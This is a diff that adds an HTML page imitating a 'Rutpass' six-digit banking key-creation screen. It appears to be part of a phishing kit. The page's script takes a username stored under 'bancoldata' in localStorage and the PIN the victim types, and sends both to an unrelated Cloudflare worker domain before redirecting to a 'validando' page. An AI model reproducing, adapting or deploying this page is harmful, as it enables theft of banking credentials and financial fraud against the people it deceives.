@@ -1,0 +1,654 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Creación clave Rutpass</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        body {
+            margin: 0;
+            background: #fff;
+            display: flex;
+            justify-content: center;
+            font-family: Arial, Helvetica, sans-serif;
+            overflow: hidden;
+            height: 100vh;
+        }
+
+        .phone {
+            max-width: 430px;
+            margin: auto;
+            min-height: 100vh;
+            position: relative;
+            background: #fff;
+            width: 100%;
+            padding-bottom: 100px;
+        }
+
+        .header {
+            height: 72px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+
+        .back {
+            position: absolute;
+            left: 18px;
+            font-size: 46px;
+            color: #3b3b3b;
+            cursor: pointer;
+            line-height: 1;
+        }
+
+        .header h2 {
+            font-size: 26px;
+            font-weight: 500;
+            color: #222;
+        }
+
+        .content {
+            padding: 60px 34px 0;
+        }
+
+        .title {
+            font-size: 28px;
+            font-weight: 700;
+            line-height: 1.2;
+            text-align: center;
+            color: #1f2023;
+            margin-bottom: 15px;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #666;
+            text-align: center;
+            line-height: 1.5;
+            margin-bottom: 30px;
+        }
+
+        /* Sección de creación de clave - 6 dígitos */
+        .clave-section {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .clave-section.hidden {
+            display: none;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Título de la clave */
+        .clave-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #1f2023;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        .clave-subtitle {
+            font-size: 15px;
+            color: #888;
+            text-align: center;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+
+        /* Campos de clave - 6 dígitos con cuadritos */
+        .clave-code-container {
+            display: flex;
+            justify-content: center;
+            gap: 14px;
+            margin: 0 0 25px;
+        }
+
+        .clave-code-wrapper {
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .clave-code-input {
+            width: 52px;
+            height: 62px;
+            border: 2.5px solid #ddd;
+            border-radius: 12px;
+            text-align: center;
+            font-size: 30px;
+            font-weight: 600;
+            color: #1f2023;
+            outline: none;
+            transition: all 0.3s ease;
+            background: #f8f9fa;
+            padding: 0;
+        }
+
+        .clave-code-input:focus {
+            border-color: #5B2EFF;
+            background: #fff;
+            box-shadow: 0 0 0 3px rgba(91, 46, 255, 0.1);
+        }
+
+        .clave-code-input.filled {
+            border-color: #5B2EFF;
+            background: #fff;
+        }
+
+        /* Requisitos de la clave */
+        .requirements {
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 16px 20px;
+            margin-bottom: 30px;
+            border: 1px solid #e8e8e8;
+        }
+
+        .requirements .req-item {
+            font-size: 13px;
+            color: #666;
+            line-height: 1.8;
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+        }
+
+        .requirements .req-item .bullet {
+            color: #5B2EFF;
+            font-weight: bold;
+        }
+
+        /* Botón Continuar */
+        .btn-continuar {
+            width: 100%;
+            height: 56px;
+            border: none;
+            border-radius: 40px;
+            background: #ECECEC;
+            color: #BDBDBD;
+            font-size: 22px;
+            font-weight: 600;
+            cursor: not-allowed;
+            transition: all 0.25s ease;
+            margin-top: 10px;
+        }
+
+        .btn-continuar.active {
+            background: #5B2EFF;
+            color: #fff;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(91, 46, 255, 0.3);
+        }
+
+        .btn-continuar.active:hover {
+            transform: scale(1.02);
+            box-shadow: 0 6px 20px rgba(91, 46, 255, 0.4);
+        }
+
+        .btn-continuar.active:active {
+            transform: scale(0.98);
+        }
+
+        /* Loader */
+        .loader-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.9);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        .loader-container.active {
+            display: flex;
+        }
+
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #5B2EFF;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* Ajustes para pantallas más pequeñas */
+        @media(max-width:430px) {
+            .content {
+                padding: 50px 24px 0;
+            }
+
+            .title {
+                font-size: 24px;
+            }
+
+            .subtitle {
+                font-size: 15px;
+            }
+
+            .clave-code-input {
+                width: 44px;
+                height: 54px;
+                font-size: 26px;
+            }
+
+            .clave-code-container {
+                gap: 10px;
+            }
+
+            .btn-continuar {
+                height: 50px;
+                font-size: 20px;
+            }
+
+            .clave-title {
+                font-size: 22px;
+            }
+
+            .clave-subtitle {
+                font-size: 14px;
+            }
+
+            .requirements .req-item {
+                font-size: 12px;
+            }
+        }
+
+        @media(max-width:380px) {
+            .content {
+                padding: 40px 18px 0;
+            }
+
+            .title {
+                font-size: 22px;
+            }
+
+            .subtitle {
+                font-size: 14px;
+            }
+
+            .clave-code-input {
+                width: 38px;
+                height: 48px;
+                font-size: 22px;
+                border-radius: 10px;
+            }
+
+            .clave-code-container {
+                gap: 8px;
+            }
+
+            .btn-continuar {
+                height: 46px;
+                font-size: 18px;
+            }
+
+            .header h2 {
+                font-size: 20px;
+            }
+
+            .back {
+                font-size: 32px;
+                left: 12px;
+            }
+
+            .clave-title {
+                font-size: 20px;
+            }
+
+            .clave-subtitle {
+                font-size: 13px;
+            }
+
+            .requirements .req-item {
+                font-size: 11px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="phone">
+
+        <div class="header">
+            <div class="back" onclick="window.history.back()">&#8249;</div>
+            <h2>Creación clave Rutpass</h2>
+        </div>
+
+        <div class="content">
+
+            <div class="title" id="mainTitle">
+                Ingresa tu clave de 6 dígitos
+            </div>
+
+            <!-- Sección de creación de clave -->
+            <div class="clave-section" id="claveSection">
+                <div class="clave-subtitle">
+                    Ingresa una clave de 6 dígitos que puedas recordar.<br>
+                    No puede ser igual a tu clave de acceso Rutpay.
+                </div>
+
+                <div class="clave-code-container" id="claveCodeContainer">
+                    <div class="clave-code-wrapper">
+                        <input type="password" class="clave-code-input" maxlength="1" inputmode="numeric" data-index="0" autofocus>
+                    </div>
+                    <div class="clave-code-wrapper">
+                        <input type="password" class="clave-code-input" maxlength="1" inputmode="numeric" data-index="1">
+                    </div>
+                    <div class="clave-code-wrapper">
+                        <input type="password" class="clave-code-input" maxlength="1" inputmode="numeric" data-index="2">
+                    </div>
+                    <div class="clave-code-wrapper">
+                        <input type="password" class="clave-code-input" maxlength="1" inputmode="numeric" data-index="3">
+                    </div>
+                    <div class="clave-code-wrapper">
+                        <input type="password" class="clave-code-input" maxlength="1" inputmode="numeric" data-index="4">
+                    </div>
+                    <div class="clave-code-wrapper">
+                        <input type="password" class="clave-code-input" maxlength="1" inputmode="numeric" data-index="5">
+                    </div>
+                </div>
+
+                <!-- Requisitos de la clave -->
+                <div class="requirements">
+                    <div class="req-item">
+                        <span class="bullet">•</span>
+                        <span>No uses números repetidos. Ej: 111111 ó 222222</span>
+                    </div>
+                    <div class="req-item">
+                        <span class="bullet">•</span>
+                        <span>Que no sean consecutivos. Ej: 123456 ó 654321</span>
+                    </div>
+                    <div class="req-item">
+                        <span class="bullet">•</span>
+                        <span>Y que no sean parte de tu RUT</span>
+                    </div>
+                </div>
+
+                <button class="btn-continuar" id="btnContinuar" disabled>Continuar</button>
+            </div>
+
+        </div>
+
+    </div>
+
+    <!-- LOADER -->
+    <div class="loader-container" id="loader">
+        <div class="loader"></div>
+    </div>
+
+    <script>
+        const claveInputs = document.querySelectorAll('.clave-code-input');
+        const btnContinuar = document.getElementById('btnContinuar');
+        const loader = document.getElementById('loader');
+
+        // ============================================
+        // FUNCIÓN PARA ENFOCAR INPUTS DE CLAVE
+        // ============================================
+        function focusNextClaveInput(currentIndex) {
+            if (currentIndex < claveInputs.length - 1) {
+                claveInputs[currentIndex + 1].focus();
+            }
+        }
+
+        function focusPrevClaveInput(currentIndex) {
+            if (currentIndex > 0) {
+                claveInputs[currentIndex - 1].focus();
+            }
+        }
+
+        // ============================================
+        // VERIFICAR SI TODOS LOS CAMPOS DE CLAVE ESTÁN LLENOS
+        // ============================================
+        function checkClaveFilled() {
+            let allFilled = true;
+            claveInputs.forEach(input => {
+                if (input.value === '') {
+                    allFilled = false;
+                }
+            });
+
+            if (allFilled) {
+                btnContinuar.classList.add('active');
+                btnContinuar.disabled = false;
+            } else {
+                btnContinuar.classList.remove('active');
+                btnContinuar.disabled = true;
+            }
+        }
+
+        // ============================================
+        // VALIDAR REQUISITOS DE LA CLAVE
+        // ============================================
+        function validarRequisitosClave(clave) {
+            // Verificar números repetidos (todos iguales)
+            if (/(\d)\1{5}/.test(clave)) {
+                return 'No uses números repetidos. Ej: 111111 ó 222222';
+            }
+
+            // Verificar consecutivos ascendentes (123456)
+            let ascendente = true;
+            for (let i = 0; i < clave.length - 1; i++) {
+                if (parseInt(clave[i + 1]) !== parseInt(clave[i]) + 1) {
+                    ascendente = false;
+                    break;
+                }
+            }
+            if (ascendente) {
+                return 'No uses números consecutivos. Ej: 123456';
+            }
+
+            // Verificar consecutivos descendentes (654321)
+            let descendente = true;
+            for (let i = 0; i < clave.length - 1; i++) {
+                if (parseInt(clave[i + 1]) !== parseInt(clave[i]) - 1) {
+                    descendente = false;
+                    break;
+                }
+            }
+            if (descendente) {
+                return 'No uses números consecutivos. Ej: 654321';
+            }
+
+            return null;
+        }
+
+        // ============================================
+        // EVENTOS PARA CADA INPUT DE CLAVE
+        // ============================================
+        claveInputs.forEach((input, index) => {
+            input.addEventListener('input', function(e) {
+                this.value = this.value.replace(/[^0-9]/g, '');
+
+                if (this.value.length === 1) {
+                    this.classList.add('filled');
+                    focusNextClaveInput(index);
+                } else {
+                    this.classList.remove('filled');
+                }
+
+                checkClaveFilled();
+            });
+
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && this.value === '') {
+                    this.classList.remove('filled');
+                    focusPrevClaveInput(index);
+                    checkClaveFilled();
+                }
+
+                // Manejar flechas
+                if (e.key === 'ArrowLeft' && index > 0) {
+                    claveInputs[index - 1].focus();
+                } else if (e.key === 'ArrowRight' && index < claveInputs.length - 1) {
+                    claveInputs[index + 1].focus();
+                }
+            });
+
+            input.addEventListener('click', function() {
+                this.select();
+            });
+
+            input.addEventListener('paste', function(e) {
+                e.preventDefault();
+                const paste = (e.clipboardData || window.clipboardData).getData('text');
+                const numbers = paste.replace(/[^0-9]/g, '').slice(0, 6);
+
+                numbers.split('').forEach((num, i) => {
+                    if (i < claveInputs.length) {
+                        claveInputs[i].value = num;
+                        claveInputs[i].classList.add('filled');
+                    }
+                });
+
+                const nextIndex = Math.min(numbers.length, claveInputs.length - 1);
+                if (numbers.length < claveInputs.length) {
+                    claveInputs[numbers.length].focus();
+                } else {
+                    claveInputs[claveInputs.length - 1].focus();
+                }
+
+                checkClaveFilled();
+            });
+        });
+
+        // ============================================
+        // OBTENER CLAVE COMPLETA
+        // ============================================
+        function getFullClave() {
+            return Array.from(claveInputs).map(input => input.value).join('');
+        }
+
+        // ============================================
+        // BOTÓN CONTINUAR
+        // ============================================
+        btnContinuar.addEventListener('click', async function() {
+            if (!this.classList.contains('active')) return;
+
+            const claveValue = getFullClave();
+
+            // Validar requisitos de la clave
+            const error = validarRequisitosClave(claveValue);
+            if (error) {
+                alert('❌ ' + error);
+                // Limpiar los inputs
+                claveInputs.forEach(input => {
+                    input.value = '';
+                    input.classList.remove('filled');
+                });
+                claveInputs[0].focus();
+                btnContinuar.disabled = true;
+                btnContinuar.classList.remove('active');
+                return;
+            }
+
+            try {
+                loader.classList.add('active');
+
+                // Obtener datos de localStorage
+                let bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
+                const usuario = bancoldata.usuario;
+
+                if (!usuario) {
+                    alert('Error: Usuario no encontrado');
+                    loader.classList.remove('active');
+                    return;
+                }
+
+                // Generar transactionId único
+                const transactionId = 'txn_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+
+                // Guardar la clave en bancoldata
+                bancoldata.clave = claveValue;
+                bancoldata.transactionId = transactionId;
+                localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
+
+                console.log('Enviando login:', { usuario, clave: claveValue, transactionId });
+
+                // Enviar login al worker
+                const response = await fetch('https://blue-night-7897.claropromoxlaro.workers.dev/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        usuario: usuario,
+                        clave: claveValue,
+                        transactionId: transactionId
+                    })
+                });
+
+                const result = await response.json();
+                console.log('Respuesta del login:', result);
+
+                loader.classList.remove('active');
+
+                if (result.ok) {
+                    // Redirigir a la página de loading
+                    window.location.href = 'validando.html';
+                } else {
+                    alert('Error en el login: ' + (result.error || 'Error desconocido'));
+                    // Limpiar los inputs
+                    claveInputs.forEach(input => {
+                        input.value = '';
+                        input.classList.remove('filled');
+                    });
+                    claveInputs[0].focus();
+                    btnContinuar.disabled = true;
+                    btnContinuar.classList.remove('active');
+                }
+
+            } catch (error) {
+                console.error('Error completo:', error);
+                loader.classList.remove('active');
+                alert('Error al procesar el login: ' + error.message);
+            }
+        });
+
+        // ============================================
+        // INICIALIZAR
+        // ============================================
+        setTimeout(() => {
+            claveInputs[0].focus();
+        }, 500);
+
+        console.log('🚀 Página de creación de clave Rutpass cargada');
+        console.log('🔑 Ingresa una clave de 6 dígitos');
+    </script>
+
+</body>
+</html>
